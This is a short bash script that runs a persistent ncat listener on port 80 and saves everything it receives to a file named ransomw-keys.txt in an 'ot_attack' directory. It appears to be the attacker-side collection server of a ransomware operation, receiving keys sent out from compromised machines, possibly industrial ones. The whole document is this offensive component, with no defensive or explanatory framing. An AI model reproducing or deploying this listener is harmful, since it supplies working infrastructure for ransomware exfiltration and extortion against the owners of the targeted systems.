#!/bin/bash

ncat -k -l -p 80 | tee /opt/ot_attack/ransomw-keys.txt
